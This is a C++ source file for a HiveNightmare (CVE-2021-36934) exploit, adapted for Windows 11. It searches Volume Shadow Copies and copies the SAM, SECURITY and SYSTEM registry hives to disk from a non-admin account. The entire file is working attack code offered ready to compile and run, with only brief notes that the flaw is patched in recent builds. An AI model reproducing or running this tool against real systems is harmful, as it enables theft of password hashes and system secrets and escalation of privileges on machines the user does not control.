// HiveNightmare exploit, adjusted for Windows 11 (CVE-2021-36934)
// Note: This vulnerability is patched in recent Windows 10/11 builds.
// This PoC may only work on unpatched or vulnerable systems with accessible shadow copies.

#include <windows.h>
#include <io.h>
#include <fcntl.h>
#include <iostream>
#include <VersionHelpers.h> // For OS version checks

using std::endl;
using std::wcout;

#define MAX_VSS_SEARCH 50 // Increase max search for Windows 11 environments

void printLastError(const wchar_t* msg) {
    DWORD err = GetLastError();
    LPWSTR errMsg = NULL;
    FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL, err, 0, (LPWSTR)&errMsg, 0, NULL);
    wcout << msg << L" (Error " << err << L"): " << (errMsg ? errMsg : L"Unknown") << endl;
    if (errMsg) LocalFree(errMsg);
}

HANDLE getVssFileHandle(TCHAR* path, int maxSearch) {
    HANDLE hfile;
    HANDLE retHandle = INVALID_HANDLE_VALUE;
    FILETIME creationTime;
    FILETIME lastAccessTime;
    FILETIME lastWriteTime;
    FILETIME youngest = { 0, 0 };

    wchar_t base[] = L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy";

    for (int i = 1; i <= maxSearch; i++) {
        wchar_t fullPath[MAX_PATH];
        swprintf_s(fullPath, MAX_PATH, L"%s%d\\%s", base, i, path);

        hfile = CreateFile(fullPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hfile != INVALID_HANDLE_VALUE) {
            if (GetFileTime(hfile, &creationTime, &lastAccessTime, &lastWriteTime)) {
                if (CompareFileTime(&youngest, &lastWriteTime) < 0) {
                    if (retHandle != INVALID_HANDLE_VALUE) CloseHandle(retHandle);
                    retHandle = hfile;
                    youngest = lastWriteTime;
                    wcout << "Newer file found: " << fullPath << endl;
                }
                else {
                    CloseHandle(hfile);
                }
            }
        }
    }
    return retHandle;
}

void dumpHandleToFile(HANDLE handle, wchar_t* dest) {
    HANDLE hAppend;
    DWORD  dwBytesRead, dwBytesWritten, dwPos;
    BYTE   buff[4096];
    hAppend = CreateFile(dest, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hAppend == INVALID_HANDLE_VALUE)
    {
        printLastError(L"Could not write to output file");
        return;
    }

    while (ReadFile(handle, buff, sizeof(buff), &dwBytesRead, NULL)
        && dwBytesRead > 0)
    {
        dwPos = SetFilePointer(hAppend, 0, NULL, FILE_END);
        LockFile(hAppend, dwPos, 0, dwBytesRead, 0);
        WriteFile(hAppend, buff, dwBytesRead, &dwBytesWritten, NULL);
        UnlockFile(hAppend, dwPos, 0, dwBytesRead, 0);
    }
    CloseHandle(hAppend);
}

bool getFileTime(HANDLE handle, LPTSTR buf, int buflen) {
    FILETIME creationTime;
    FILETIME lastAccessTime;
    FILETIME lastWriteTime;
    SYSTEMTIME st;

    if (!GetFileTime(handle, &creationTime, &lastAccessTime, &lastWriteTime)) {
        if (buflen > 0)
            buf[0] = L'\0';
        return false;
    }
    FileTimeToSystemTime(&lastWriteTime, &st);
    GetDateFormat(LOCALE_USER_DEFAULT, 0, &st, L"yyyy-MM-dd", buf, buflen);

    return true;
}

int main(int argc, char* argv[])
{
    int searchDepth = MAX_VSS_SEARCH;
    _setmode(_fileno(stdout), _O_U16TEXT);

    // OS version check (optional but informative)
    if (!IsWindows10OrGreater()) {
        wcout << L"Warning: This exploit is designed for Windows 10/11 systems." << endl;
    }

    if (argc > 1) {
        if (sscanf_s(argv[1], "%d", &searchDepth) != 1) {
            wcout << "\nUsage: HiveNightmare.exe [max shadows to look at (default " << MAX_VSS_SEARCH << L")]\n\n";
            return -1;
        }
    }

    wcout << L"\nHiveNightmare v0.6 (Windows 11 adjusted) - dump registry hives as non-admin users\n\n";
    wcout << L"Specify maximum number of shadows to inspect with parameter if wanted, default is " << MAX_VSS_SEARCH << L".\n\nRunning...\n\n";

    HANDLE hFile;

    TCHAR samLocation[] = L"Windows\\System32\\config\\SAM";
    TCHAR securityLocation[] = L"Windows\\System32\\config\\SECURITY";
    TCHAR systemLocation[] = L"Windows\\System32\\config\\SYSTEM";
    TCHAR fileTime[200];
    TCHAR fileName[40];

    // Try to dump each hive
    struct { TCHAR* path; wchar_t* prefix; } hives[] = {
        { samLocation, L"SAM" }, { securityLocation, L"SECURITY" }, { systemLocation, L"SYSTEM" }
    };

    for (auto& hive : hives) {
        hFile = getVssFileHandle(hive.path, searchDepth);
        if (hFile == INVALID_HANDLE_VALUE) {
            wcout << L"Could not open " << hive.prefix << L" :( Is System Protection enabled or vulnerability fixed? Try increasing number of VSS snapshots to search - list with 'vssadmin list shadows'" << endl;
            printLastError(L"Last error");
            continue;
        }
        getFileTime(hFile, fileTime, 200);
        swprintf_s(fileName, 40, L"%s-%s", hive.prefix, fileTime);
        dumpHandleToFile(hFile, fileName);
        CloseHandle(hFile);
        wcout << endl << L"Success: " << hive.prefix << L" hive from " << fileTime << L" written out as " << fileName << endl << endl;
    }

    wcout << endl << L"Assuming no errors above, you should find hive dump files in the current working directory." << endl;
    wcout << L"If this fails on Windows 11, the vulnerability is likely patched (see CVE-2021-36934)." << endl;

    return 0;
}
